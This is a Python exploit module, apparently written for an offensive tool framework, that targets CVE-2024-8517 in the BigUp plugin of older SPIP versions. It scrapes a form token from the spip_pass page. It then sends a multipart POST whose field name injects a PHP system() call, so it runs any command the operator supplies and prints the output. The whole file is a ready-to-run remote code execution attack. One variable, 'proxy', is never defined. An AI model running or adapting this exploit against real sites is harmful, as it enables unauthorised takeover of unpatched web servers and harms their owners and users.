#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> AUTOHEADER >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
#   
#   Title : CVE-2024-8517
#   Author: Wayko
#   Information: The BigUp plugin used by SPIP before 4.3.2, 4.2.16, and 4.1.18 
#                is vulnerable to an arbitrary code execution vulnerability.
#
#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< AUTOHEADER <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

import re
import logging
import random
import string

from hmc.modules import Module, Argument
from urllib.parse import urlparse, urljoin

log = logging.getLogger("hmc")

class SPIPBigUpRCE(Module):
    module_name = "bigup_rce"
    module_desc = "RCE on BigUp plugin (CVE-2024-8517)"
    module_auth = "wayko"

    module_args = [
        Argument("url", desc="Target URL (e.g., http://example.org)"),
        Argument("cmd", "-c", "--cmd", desc="Command to execute", default="id")
    ]

    async def execute(self, url: str, cmd: str):
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        up = urlparse(url)
        host = up.hostname
        endpoint = "/spip.php?page=spip_pass&lang=fr"
        full_url = urljoin(url, endpoint)

        try:
            get_resp = await self.env.get(full_url)
            if not get_resp or get_resp.status != 200:
                self.log_failure("[-] Failed to fetch initial page")
                return {'bigup_rce': None}

            match = re.search(r'name=["\']formulaire_action_args["\']\s+type=["\']hidden["\']\s+value=["\']([^"\']+)', get_resp.body)
            if not match:
                self.log_failure("[-] Failed to extract formulaire_action_args token")
                return {'bigup_rce': None}

            token = match.group(1)
            payload_field = f"RCE['.system('{cmd}').die().']"

            boundary = "5f02b65945d644d6a32847ab130e9586"
            data = f"""--{boundary}
Content-Disposition: form-data; name="page"

spip_pass
--{boundary}
Content-Disposition: form-data; name="lang"

fr
--{boundary}
Content-Disposition: form-data; name="formulaire_action"

oubli
--{boundary}
Content-Disposition: form-data; name="formulaire_action_args"

{token}
--{boundary}
Content-Disposition: form-data; name="formulaire_action_sign"


--{boundary}
Content-Disposition: form-data; name="oubli"

hmc@hmc.io
--{boundary}
Content-Disposition: form-data; name="nobot"


--{boundary}
Content-Disposition: form-data; name="bigup_retrouver_fichiers"

a
--{boundary}
Content-Disposition: form-data; name="{payload_field}"; filename="hmc.txt"
Content-Type: text/plain

test
--{boundary}--"""

            headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Accept": "*/*",
                "Connection": "close"
            }

            post_resp = await self.env.post(
                url=full_url,
                headers=headers,
                data=data,
                proxy=proxy
            )

            if not post_resp:
                self.log_failure("[-] No response from target")
                return {'bigup_rce': None}
            body = post_resp.body
            cleaned_body = body.strip()

            if cleaned_body and len(cleaned_body) < 500:
                print(f"{cleaned_body}")
                return {'bigup_rce': cleaned_body}

            self.log_failure("[-] No command output detected (not vulnerable or no visible output)")
            return {'bigup_rce': None}

        except Exception as e:
            self.log_failure(f"[-] Error during exploitation: {e}")
            return {'bigup_rce': None}